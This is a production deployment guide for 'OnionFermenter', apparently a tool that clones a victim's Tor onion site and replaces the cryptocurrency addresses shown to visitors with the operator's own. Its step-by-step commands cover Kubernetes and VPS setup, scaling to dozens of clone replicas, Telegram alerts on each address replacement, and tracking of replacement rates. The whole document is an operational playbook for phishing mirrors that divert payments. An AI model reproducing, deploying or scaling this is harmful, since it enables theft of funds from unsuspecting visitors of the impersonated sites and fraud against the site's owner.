# Production Deployment Guide

Complete checklist for deploying OnionFermenter in a production environment.

## Pre-Deployment Checklist

### Infrastructure Requirements

- [ ] Kubernetes cluster provisioned (or VPS with systemd)
- [ ] kubectl configured and tested
- [ ] Helm installed (for Kubernetes)
- [ ] Sufficient resources allocated (minimum 512MB RAM per pod)
- [ ] Network connectivity to Tor network verified
- [ ] DNS/domain setup (if using custom domains)

### Security Configuration

- [ ] Cryptocurrency addresses generated and secured offline
- [ ] Address file created with multiple addresses (recommended: 100+)
- [ ] Address file stored securely (encrypted backup recommended)
- [ ] Telegram bot created with secure token
- [ ] Environment variables documented in secure location
- [ ] Access controls configured (namespace permissions for Kubernetes)

### Monitoring Setup

- [ ] Telegram notifications configured and tested
- [ ] Log aggregation configured (e.g., ELK stack, Grafana Loki)
- [ ] Alerting rules created for pod failures
- [ ] Resource monitoring enabled
- [ ] Tor connectivity monitoring setup

## Production Deployment Steps

### Option 1: Kubernetes Production Deployment

#### 1. Cluster Setup

**Cloud Provider Setup** (choose one):

**AWS EKS**:
```bash
# Install eksctl
curl --silent --location "https://github.com/weaveworks/eksctl/releases/latest/download/eksctl_$(uname -s)_amd64.tar.gz" | tar xz -C /tmp
sudo mv /tmp/eksctl /usr/local/bin

# Create production cluster with multiple nodes
eksctl create cluster \
  --name onionfermenter-prod \
  --region us-east-1 \
  --nodes 3 \
  --nodes-min 2 \
  --nodes-max 10 \
  --node-type t3.medium \
  --with-oidc \
  --managed

# Verify cluster
kubectl get nodes
```

**Google GKE**:
```bash
# Create production cluster
gcloud container clusters create onionfermenter-prod \
  --num-nodes=3 \
  --machine-type=e2-medium \
  --enable-autoscaling \
  --min-nodes=2 \
  --max-nodes=10 \
  --zone=us-central1-a \
  --enable-stackdriver-kubernetes

# Get credentials
gcloud container clusters get-credentials onionfermenter-prod --zone=us-central1-a

# Verify
kubectl get nodes
```

**Azure AKS**:
```bash
# Create resource group
az group create --name OnionFermenterProd --location eastus

# Create production cluster
az aks create \
  --resource-group OnionFermenterProd \
  --name onionfermenter-prod \
  --node-count 3 \
  --enable-addons monitoring \
  --enable-cluster-autoscaler \
  --min-count 2 \
  --max-count 10 \
  --node-vm-size Standard_D2s_v3 \
  --generate-ssh-keys

# Get credentials
az aks get-credentials --resource-group OnionFermenterProd --name onionfermenter-prod

# Verify
kubectl get nodes
```

#### 2. Prepare Configuration Files

```bash
# Clone repository
git clone https://github.com/bitbybit91/OnionFermenter.git
cd OnionFermenter

# Create production address file (100+ addresses recommended)
# Use addresses from your secure offline wallet
nano prod-addresses.txt

# Set production environment variables
export VICTIM_ONION_ID=<target_onion_id_56_chars>
export ADDRESS_FILE="$(pwd)/prod-addresses.txt"
export CURRENCY_TYPE=BTC  # or XMR
export NREPLICAS=10  # Start with 10, scale as needed
export TELEGRAM_BOT_TOKEN=<your_production_bot_token>
export TELEGRAM_CHAT_ID=<your_chat_id>
```

#### 3. Deploy to Production

```bash
# Deploy
make deploy

# Verify deployment
kubectl -n onionfermenter get pods
kubectl -n onionfermenter get deployments
kubectl -n onionfermenter get services

# Wait for all pods to be Running (may take 2-3 minutes)
kubectl -n onionfermenter get pods -w

# Get onion addresses
make get-addresses > prod-onion-addresses.txt

# Store addresses securely
chmod 600 prod-onion-addresses.txt
```

#### 4. Configure Monitoring

**Logs**:
```bash
# Stream logs from all pods
kubectl -n onionfermenter logs -f -l app=onionfermenter

# Filter for specific events
kubectl -n onionfermenter logs -l app=onionfermenter | grep -i "replaced"
kubectl -n onionfermenter logs -l app=onionfermenter | grep -i "telegram"
```

**Resource Monitoring**:
```bash
# Watch resource usage
kubectl top pods -n onionfermenter
kubectl top nodes

# Set resource limits in values.yaml if needed
```

**Prometheus/Grafana** (optional but recommended):
```bash
# Install Prometheus operator
helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
helm repo update
helm install prometheus prometheus-community/kube-prometheus-stack -n monitoring --create-namespace

# Access Grafana (default credentials: admin/prom-operator)
kubectl port-forward -n monitoring svc/prometheus-grafana 3000:80
```

#### 5. Configure Auto-Scaling

```bash
# Install metrics server (if not already installed)
kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml

# Create HorizontalPodAutoscaler
cat <<EOF | kubectl apply -f -
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: onionfermenter-hpa
  namespace: onionfermenter
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: <your-deployment-name>
  minReplicas: 5
  maxReplicas: 50
  metrics:
  - type: Resource
    resource:
      name: cpu
      target:
        type: Utilization
        averageUtilization: 70
  - type: Resource
    resource:
      name: memory
      target:
        type: Utilization
        averageUtilization: 80
EOF

# Verify HPA
kubectl get hpa -n onionfermenter
```

### Option 2: VPS Production Deployment with Systemd

#### 1. VPS Setup

**Choose a reputable VPS provider** (recommended specs):
- 2 CPU cores minimum
- 2GB RAM minimum
- 20GB storage
- Ubuntu 22.04 LTS or Debian 11+

**Initial Server Setup**:
```bash
# Update system
sudo apt-get update
sudo apt-get upgrade -y

# Install required packages
sudo apt-get install -y \
    erlang erlang-dev erlang-parsetools \
    build-essential git wget bash \
    tor socat curl make \
    fail2ban ufw

# Configure firewall
sudo ufw allow 22/tcp  # SSH
sudo ufw enable

# Configure Tor
sudo systemctl enable tor
sudo systemctl start tor
```

#### 2. Install OnionFermenter

```bash
# Clone and build
cd /opt
sudo git clone https://github.com/bitbybit91/OnionFermenter.git
cd OnionFermenter
sudo rebar3 as prod release

# Install
sudo mkdir -p /opt/onionfermenter
sudo cp -r _build/prod/rel/onionfermenter/* /opt/onionfermenter/
sudo cp deploy/run.sh /opt/onionfermenter/
sudo chmod +x /opt/onionfermenter/run.sh

# Create address file (use your secure addresses)
sudo nano /opt/onionfermenter/BTC-ADDRESSES.txt

# Set proper permissions
sudo chown -R tor:tor /opt/onionfermenter
sudo chmod 600 /opt/onionfermenter/BTC-ADDRESSES.txt
```

#### 3. Configure Systemd Service

```bash
# Copy and edit service file
sudo cp deploy/onionfermenter.service /etc/systemd/system/
sudo nano /etc/systemd/system/onionfermenter.service

# Update these values:
# Environment="VICTIM_ONION_ID=your_target_onion_id"
# Environment="CURRENCY_TYPE=BTC"
# Environment="TELEGRAM_BOT_TOKEN=your_token"
# Environment="TELEGRAM_CHAT_ID=your_chat_id"

# Enable and start service
sudo systemctl daemon-reload
sudo systemctl enable onionfermenter
sudo systemctl start onionfermenter

# Verify it's running
sudo systemctl status onionfermenter
```

#### 4. Setup Monitoring

**Log Rotation**:
```bash
# Create logrotate config
sudo cat > /etc/logrotate.d/onionfermenter << EOF
/var/log/onionfermenter/*.log {
    daily
    rotate 14
    compress
    delaycompress
    notifempty
    create 0640 tor tor
    sharedscripts
    postrotate
        systemctl reload onionfermenter
    endscript
}
EOF
```

**Monitoring Script**:
```bash
# Create monitoring script
sudo cat > /usr/local/bin/monitor-onionfermenter.sh << 'EOF'
#!/bin/bash
# Check if OnionFermenter is running
if ! systemctl is-active --quiet onionfermenter; then
    echo "OnionFermenter is not running! Restarting..."
    systemctl restart onionfermenter
    
    # Send alert via Telegram (optional)
    TELEGRAM_BOT_TOKEN="YOUR_TOKEN"
    TELEGRAM_CHAT_ID="YOUR_CHAT_ID"
    MESSAGE="⚠️ OnionFermenter was down and has been restarted on $(hostname)"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "text=${MESSAGE}"
fi
EOF

sudo chmod +x /usr/local/bin/monitor-onionfermenter.sh

# Add to crontab (check every 5 minutes)
(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/local/bin/monitor-onionfermenter.sh") | crontab -
```

## Post-Deployment Verification

### 1. Verify Deployment

```bash
# Kubernetes
kubectl -n onionfermenter get pods
kubectl -n onionfermenter logs -l app=onionfermenter --tail=50

# Systemd
sudo systemctl status onionfermenter
sudo journalctl -u onionfermenter -n 50
```

### 2. Test Onion Addresses

```bash
# Get addresses
# Kubernetes:
make get-addresses

# Docker:
make get-addresses-docker

# Systemd:
sudo cat /var/lib/tor/hidden_service/hostname

# Test via Tor browser or curl
torsocks curl http://<your-onion-address>.onion
```

### 3. Verify Telegram Notifications

- You should receive a startup notification
- Test by replacing an address and checking for notification

### 4. Monitor for Issues

**First 24 hours**:
- Check logs every hour
- Verify all pods/services remain healthy
- Monitor Telegram notifications
- Test address replacement functionality

**First week**:
- Check logs daily
- Monitor resource usage
- Verify auto-scaling works (if configured)
- Collect metrics on replacement rate

## Scaling Guidelines

### When to Scale Up

- CPU usage consistently > 70%
- Memory usage consistently > 80%
- High traffic to clone sites
- Need for more geographic distribution

### Scaling Methods

**Kubernetes**:
```bash
# Manual scaling
kubectl -n onionfermenter scale deployment/<deployment-name> --replicas=20

# Update via make
export NREPLICAS=20
make deploy
```

**VPS**:
- Deploy to multiple VPS instances
- Use load balancer for distribution
- Different onion addresses for each instance

## Backup and Recovery

### Configuration Backup

```bash
# Backup environment variables
cat > ~/onionfermenter-backup.env << EOF
export VICTIM_ONION_ID=${VICTIM_ONION_ID}
export CURRENCY_TYPE=${CURRENCY_TYPE}
export TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN}
export TELEGRAM_CHAT_ID=${TELEGRAM_CHAT_ID}
EOF

# Backup address file
cp ${ADDRESS_FILE} ~/address-backup-$(date +%Y%m%d).txt

# Encrypt backup
gpg -c ~/address-backup-$(date +%Y%m%d).txt
shred -u ~/address-backup-$(date +%Y%m%d).txt
```

### Disaster Recovery

**Kubernetes**:
```bash
# Backup namespace
kubectl get all -n onionfermenter -o yaml > onionfermenter-backup.yaml

# Restore
kubectl apply -f onionfermenter-backup.yaml
```

**Systemd**:
```bash
# Backup
sudo tar -czf /backup/onionfermenter-$(date +%Y%m%d).tar.gz \
    /opt/onionfermenter \
    /etc/systemd/system/onionfermenter.service

# Restore
sudo tar -xzf /backup/onionfermenter-YYYYMMDD.tar.gz -C /
sudo systemctl daemon-reload
sudo systemctl restart onionfermenter
```

## Maintenance

### Regular Tasks

**Daily**:
- [ ] Check Telegram for alerts
- [ ] Verify services are running
- [ ] Review error logs

**Weekly**:
- [ ] Update system packages
- [ ] Review resource usage trends
- [ ] Verify backups are working
- [ ] Check for OnionFermenter updates

**Monthly**:
- [ ] Rotate credentials if needed
- [ ] Review and update address lists
- [ ] Audit access logs
- [ ] Test disaster recovery procedures

### Updating OnionFermenter

```bash
# Kubernetes
cd OnionFermenter
git pull
make build
make push
kubectl -n onionfermenter rollout restart deployment/<deployment-name>

# Systemd
cd /opt/OnionFermenter
sudo git pull
sudo rebar3 as prod release
sudo cp -r _build/prod/rel/onionfermenter/* /opt/onionfermenter/
sudo systemctl restart onionfermenter
```

## Security Best Practices

1. **Never commit sensitive data** (addresses, tokens) to version control
2. **Use encrypted storage** for address files
3. **Rotate Telegram tokens** periodically
4. **Monitor logs** for unusual activity
5. **Keep systems updated** with security patches
6. **Use strong access controls** on Kubernetes namespaces
7. **Enable audit logging** on Kubernetes clusters
8. **Implement rate limiting** if exposed to public networks
9. **Use VPN/proxy** for management access
10. **Regular security audits** of the deployment

## Troubleshooting Production Issues

See [INSTALL.md](INSTALL.md#troubleshooting) for common issues and solutions.

For production-specific issues:

**High CPU/Memory Usage**:
- Scale horizontally (add more replicas)
- Optimize address file size
- Check for memory leaks in logs

**Pods Failing to Start**:
- Check resource quotas
- Verify ConfigMap is created
- Check image pull errors

**Address Replacement Not Working**:
- Verify address file format
- Check regex patterns in logs
- Ensure CURRENCY_TYPE matches address format

## Support and Monitoring

### Recommended Monitoring Stack

- **Logs**: Grafana Loki or ELK Stack
- **Metrics**: Prometheus + Grafana
- **Alerts**: Alertmanager + Telegram
- **Tracing**: Jaeger (optional)

### Health Checks

Create automated health checks:
```bash
# Script to verify everything is working
#!/bin/bash
# Check pod health
kubectl -n onionfermenter get pods | grep -v Running && exit 1

# Check if addresses are accessible
for addr in $(make get-addresses); do
    torsocks curl -s -o /dev/null -w "%{http_code}" "http://$addr" | grep 200 || echo "Warning: $addr not responding"
done
```

---

## Production Deployment Complete!

Your OnionFermenter deployment is now production-ready with:
- ✅ High availability configuration
- ✅ Monitoring and alerting
- ✅ Auto-scaling capabilities
- ✅ Disaster recovery procedures
- ✅ Security best practices
- ✅ Maintenance procedures

For questions or issues, check the documentation or logs first.
